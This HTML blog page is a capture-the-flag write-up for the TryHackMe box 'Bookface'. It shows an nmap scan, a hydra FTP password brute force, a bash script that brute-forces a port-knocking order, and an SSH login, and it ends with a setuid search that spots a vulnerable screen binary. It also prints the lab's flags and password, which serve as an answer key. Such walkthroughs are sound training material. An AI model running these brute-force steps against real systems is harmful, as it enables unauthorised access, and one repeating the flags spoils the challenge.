<!DOCTYPE html>
<html lang=en><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title> Bookface - .burso</title>
    <meta name="description" content="Before we start, read more about following tools &amp; vulnerabilities. It will contains in this CTF
  hydra  screen - CVE-2017-5618  knock  and also you can read more about additional security method called port knocking
So let&rsquo;s start as usual with nmap.
nmap -F --top-ports 10 -sV 10.10.219.90 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.">
    <link rel="canonical" href="/ctf/bookface/">
    <link rel="icon" href="img/favicon.jpg" type="image/gif" sizes="16x16"> 
    <meta property="og:title" content="Bookface">
    <meta property="og:type" content="article">
    <meta property="og:url" content="/ctf/bookface/">
    <meta property="og:description" content="Before we start, read more about following tools &amp; vulnerabilities. It will contains in this CTF
  hydra  screen - CVE-2017-5618  knock  and also you can read more about additional security method called port knocking
So let&rsquo;s start as usual with nmap.
nmap -F --top-ports 10 -sV 10.10.219.90 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 16:37 CET Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.">
    <meta property="og:site_name" content=".burso">
    <link rel="stylesheet" href="/css/main.min.7fdf1d02dafd1a6eb5cfd0d707e17e33515b866f5d305a0ab01a4095577484fe.css" integrity="sha256-f98dAtr9Gm61z9DXB&#43;F&#43;M1Fbhm9dMFoKsBpAlVd0hP4=">
    <meta name="generator" content="Hugo 0.80.0" />
    <script type="module" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule="" src="https://unpkg.com/ionicons@5.1.2/dist/ionicons/ionicons.js"></script>
    
</head>
<body><header class="site-header">
    <nav class="site-nav" role="navigation" aria-label="breadcrumb">
    <ol itemscope itemtype="https://schema.org/BreadcrumbList" class="breadcrumb"><li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/">
    <span itemprop="name">.burso</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item  " 
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/">
    <span itemprop="name">ctf</span>
  </a>
  <meta itemprop="position" content="0" />
</li>/<li class="breadcrumb-item active hidden" aria-current="page"
  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
  <a itemtype="https://schema.org/Thing" itemprop="item" href="/ctf/bookface/">
    <span itemprop="name">bookface</span>
  </a>
  <meta itemprop="position" content="1" />
</li></ol>
    </nav>
    <h1 class="site-title hidden">
		<a href="/">.burso</a>
    </h1>
</header>
<main id="content">
<article role="article" class="content post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
    <header class="post-header">        
        <h2 class="post-title" itemprop="name headline">Bookface</h2>
        <span class="post-meta">
            <time class="date-published" datetime="2020-02-10T14:50:43&#43;07:00" itemprop="datePublished">
                Mon, 10 Feb 2020
            </time>
            
            <ul id="tags">
              
                <li> <a href="/tags/ctf">#CTF</a> </li>
              
                <li> <a href="/tags/tryhackme">#tryhackme</a> </li>
              
            </ul>
            
        </span>
    </header>
    <div class="post-content" itemprop="articleBody">
        <p>Before we start, read more about following tools &amp; vulnerabilities. It will contains in this CTF</p>
<ul>
<li>
<a href="https://www.cyberpunk.rs/password-cracker-thc-hydra" target="_blank" rel="nofollow noreferrer noopener">hydra</a></li>
<li>
<a href="https://www.gnu.org/software/screen/" target="_blank" rel="nofollow noreferrer noopener">screen</a> - 
<a href="https://www.cvedetails.com/cve/CVE-2017-5618/" target="_blank" rel="nofollow noreferrer noopener">CVE-2017-5618</a></li>
<li>
<a href="https://linux.die.net/man/1/knock" target="_blank" rel="nofollow noreferrer noopener">knock</a></li>
</ul>
<p>and also you can read more about additional security method called 
<a href="https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/" target="_blank" rel="nofollow noreferrer noopener">port knocking</a></p>
<p>So let&rsquo;s start as usual with <strong>nmap</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -F --top-ports <span style="color:#ae81ff">10</span> -sV 10.10.219.90
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-02-10 16:37 CET
Stats: 0:00:07 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
Service scan Timing: About 0.00% <span style="color:#66d9ef">done</span>
Stats: 0:00:12 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
Service scan Timing: About 0.00% <span style="color:#66d9ef">done</span>
Stats: 0:02:57 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
NSE Timing: About 97.16% <span style="color:#66d9ef">done</span>; ETC: 16:40 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.219.90
Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.

PORT     STATE  SERVICE        VERSION
21/tcp   open   ftp            vsftpd 2.0.8 or later
22/tcp   closed ssh
23/tcp   open   telnet?
25/tcp   open   smtp?
80/tcp   open   http?
110/tcp  open   pop3?
139/tcp  open   netbios-ssn?
443/tcp  open   https?
445/tcp  open   microsoft-ds?
3389/tcp open   ms-wbt-server?
</code></pre></div><p>After scan, we can see many ports open, but only from FTP we have grabbed banner <em>vsftpd 2.0.8 or later</em>.
From description of this game we know the developer&rsquo;s name: <em>Jerry</em>, so we can try brute force attack to FTP server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hydra -ljerry -P /usr/share/dict/rockyou.txt ftp://10.10.219.90 -t <span style="color:#ae81ff">16</span>  -vV                                        
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-02-10 16:28:50
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344409</span> login tries <span style="color:#f92672">(</span>l:1/p:14344409<span style="color:#f92672">)</span>, ~896526 tries per task   
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ftp://10.10.219.90:21/                   
<span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> Resolving addresses ... <span style="color:#f92672">[</span>VERBOSE<span style="color:#f92672">]</span> resolving <span style="color:#66d9ef">done</span>                                                          
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                             
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;     &#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                        
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;      &#34;</span> - <span style="color:#ae81ff">3</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 2<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                       
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;       &#34;</span> - <span style="color:#ae81ff">4</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 3<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                      
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;        &#34;</span> - <span style="color:#ae81ff">5</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 4<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                     
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;         &#34;</span> - <span style="color:#ae81ff">6</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 5<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                    
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;          &#34;</span> - <span style="color:#ae81ff">7</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                   
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;           &#34;</span> - <span style="color:#ae81ff">8</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 7<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                  
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;            &#34;</span> - <span style="color:#ae81ff">9</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 8<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                 
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;               &#34;</span> - <span style="color:#ae81ff">10</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 9<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>             
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;                  &#34;</span> - <span style="color:#ae81ff">11</span> of <span style="color:#ae81ff">14344409</span> <span style="color:#f92672">[</span>child 10<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>         
...
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.219.90 - login <span style="color:#e6db74">&#34;jerry&#34;</span> - pass <span style="color:#e6db74">&#34;prumpy&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>                                                                                                                                                  
<span style="color:#f92672">[</span>21<span style="color:#f92672">][</span>ftp<span style="color:#f92672">]</span> host: 10.10.219.90   login: jerry   password: prumpy                                                      
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> attack finished <span style="color:#66d9ef">for</span> 10.10.219.90 <span style="color:#f92672">(</span>waiting <span style="color:#66d9ef">for</span> children to complete tests<span style="color:#f92672">)</span>                                  
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found                                                        
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-02-10 16:28:01    
</code></pre></div><p><img src="https://i.kym-cdn.com/photos/images/original/000/401/463/ee2.png" alt="Many hours later" title="Many hours later"></p>
<p>And voilà, we have a password: <strong>prumpy</strong>.
Connect to FTP with jerry:prumpy and let&rsquo;s find out what is hide inside.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ftp 10.10.219.90 
Connected to 10.10.219.90.
<span style="color:#ae81ff">220</span> TryHackMe Networking CTF!
Name <span style="color:#f92672">(</span>10.10.219.90:burso<span style="color:#f92672">)</span>: jerry
<span style="color:#ae81ff">331</span> Please specify the password.
Password: 
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; passive
Passive mode on.
ftp&gt; ls
<span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>10,10,219,90,89,219<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
-rwxr-xr-x    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>              <span style="color:#ae81ff">33</span> Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2019</span> flag1
-rw-rw-r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1001</span>     <span style="color:#ae81ff">1001</span>          <span style="color:#ae81ff">141</span> Feb <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2019</span> note
<span style="color:#ae81ff">226</span> Directory send OK.
ftp&gt; get flag1
<span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>10,10,219,90,89,226<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> flag1 <span style="color:#f92672">(</span><span style="color:#ae81ff">33</span> bytes<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">33</span> bytes received in 0.000288 seconds <span style="color:#f92672">(</span><span style="color:#ae81ff">112</span> kbytes/s<span style="color:#f92672">)</span>
ftp&gt; get note
<span style="color:#ae81ff">227</span> Entering Passive Mode <span style="color:#f92672">(</span>10,10,219,90,89,216<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> note <span style="color:#f92672">(</span><span style="color:#ae81ff">141</span> bytes<span style="color:#f92672">)</span>.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">141</span> bytes received in 0.000263 seconds <span style="color:#f92672">(</span><span style="color:#ae81ff">524</span> kbytes/s<span style="color:#f92672">)</span>
</code></pre></div><p>Two files, first with flag, the second with some interesting notes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat flag1
79eb173ecb02d12d6d4832881be2cf23
</code></pre></div><ul>
<li><strong>FLAG1: 79eb173ecb02d12d6d4832881be2cf23</strong></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat note
Jerry, I finally got a chance to update our internal social media platform <span style="color:#f92672">(</span>bookface.com<span style="color:#f92672">)</span>.

Can you signup and like my doggo photos?

Thanks
</code></pre></div><p>Ouu, there is also some domain, lets look on it, if we can find there something interesting.
After couple of requests to different types of DNS records, I found the the right one.
In TXT record there are flag and also some ports, but wait. Why was there so many ports open?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host -t txt bookface.com 10.10.219.90                   
Using domain server:     
Name: 10.10.219.90
Address: 10.10.219.90#53
Aliases:          
                            
bookface.com descriptive text <span style="color:#e6db74">&#34;Ports: 6786 9893 8748 3443 - Who cares about order tho right?&#34;</span>
bookface.com descriptive text <span style="color:#e6db74">&#34;Flag2:a17f17ba86d8271da60ed8436667f412&#34;</span>
</code></pre></div><ul>
<li><strong>FLAG2: a17f17ba86d8271da60ed8436667f412</strong></li>
</ul>
<p>It looks like port knocking now. But according to comment we don&rsquo;t know order of ports,
so I wrote port-knocking-enumeration to brute force the order.</p>
<p>source: port-knocking-enumeration.sh</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
porta<span style="color:#f92672">=(</span><span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">6786</span> 9893<span style="color:#f92672">)</span>
portb<span style="color:#f92672">=(</span><span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> 3443<span style="color:#f92672">)</span>
portc<span style="color:#f92672">=(</span><span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">3443</span> 6786<span style="color:#f92672">)</span>
portd<span style="color:#f92672">=(</span><span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> 8748<span style="color:#f92672">)</span>
ip<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.10.213.66&#34;</span>

<span style="color:#66d9ef">for</span> a in <span style="color:#e6db74">${</span>porta[@]<span style="color:#e6db74">}</span>; <span style="color:#66d9ef">do</span>
        <span style="color:#66d9ef">for</span> b in <span style="color:#e6db74">${</span>portb[@]<span style="color:#e6db74">}</span>; <span style="color:#66d9ef">do</span>
                <span style="color:#66d9ef">for</span> c in <span style="color:#e6db74">${</span>portc[@]<span style="color:#e6db74">}</span>; <span style="color:#66d9ef">do</span>
                        <span style="color:#66d9ef">for</span> d in <span style="color:#e6db74">${</span>portd[@]<span style="color:#e6db74">}</span>; <span style="color:#66d9ef">do</span>
                                echo <span style="color:#e6db74">&#34;</span>$a<span style="color:#e6db74"> </span>$b<span style="color:#e6db74"> </span>$c<span style="color:#e6db74"> </span>$d<span style="color:#e6db74">&#34;</span>
                                knock $ip $a $b $c $d <span style="color:#f92672">&amp;&amp;</span> nmap -p <span style="color:#ae81ff">22</span> $ip 2&gt;&amp;<span style="color:#ae81ff">1</span> | grep <span style="color:#e6db74">&#34;open&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[SUCCESS!!] </span>$a<span style="color:#e6db74"> </span>$b<span style="color:#e6db74"> </span>$c<span style="color:#e6db74"> </span>$d<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">&amp;&amp;</span> exit
                                sleep <span style="color:#ae81ff">1</span>
                        <span style="color:#66d9ef">done</span>
                <span style="color:#66d9ef">done</span>
        <span style="color:#66d9ef">done</span>
<span style="color:#66d9ef">done</span>
</code></pre></div><p>Let&rsquo;s brute force it!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./port-knocking-enumeration.sh 
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">3443</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">6786</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">9893</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">3443</span> <span style="color:#ae81ff">8748</span>
<span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span>
22/tcp open  ssh
<span style="color:#f92672">[</span>SUCCESS!!<span style="color:#f92672">]</span> <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span>
</code></pre></div><p>Now we have the right order! We can verify it..</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ knock 10.10.213.66 <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#f92672">&amp;&amp;</span> nmap -sV -p22 10.10.213.66
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-02-10 19:55 CET
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.213.66
Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.12 seconds
</code></pre></div><p>aand connect to ssh. Password is same as on FTP of course ;)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ knock 10.10.213.66 <span style="color:#ae81ff">8748</span> <span style="color:#ae81ff">9893</span> <span style="color:#ae81ff">6786</span> <span style="color:#ae81ff">3443</span> <span style="color:#f92672">&amp;&amp;</span> ssh jerry@10.10.213.66
jerry@10.10.213.66<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Welcome to Ubuntu 16.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-1072-aws x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

<span style="color:#ae81ff">73</span> packages can be updated.
<span style="color:#ae81ff">48</span> updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Feb <span style="color:#ae81ff">23</span> 22:17:39 <span style="color:#ae81ff">2019</span> from 10.0.0.20
jerry@ip-10-10-213-66:~$ 
</code></pre></div><p>We&rsquo;re in, so let&rsquo;s find another flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jerry@ip-10-10-213-66:/home$ find / -name <span style="color:#e6db74">&#34;flag3&#34;</span> 2&gt;/dev/null
/home/flag3
jerry@ip-10-10-213-66:/home$ cat /home/flag3 
dd059316033c59f00057e5552140f831
</code></pre></div><ul>
<li><strong>FLAG3: dd059316033c59f00057e5552140f831</strong></li>
</ul>
<p>Okey, that was pretty easy, but for the last one flag we will need the root priviledges.
So how to find vulnerability to gain the root priviledges? Let&rsquo;s search some binaries with

<a href="https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits" target="_blank" rel="nofollow noreferrer noopener">setuid bit flag</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jerry@ip-10-10-140-162:/etc$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
/snap/core/5742/bin/mount                                
/snap/core/5742/bin/ping
/snap/core/5742/bin/ping6
/snap/core/5742/bin/su
/snap/core/5742/bin/umount
/snap/core/5742/usr/bin/chfn 
/snap/core/5742/usr/bin/chsh 
/snap/core/5742/usr/bin/gpasswd
/snap/core/5742/usr/bin/newgrp
...
/bin/umount
/bin/fusermount
/bin/ntfs-3g
/bin/ping
/bin/su
/bin/ping6
/bin/screen-4.5.0/screen-4.05.0
/bin/mount
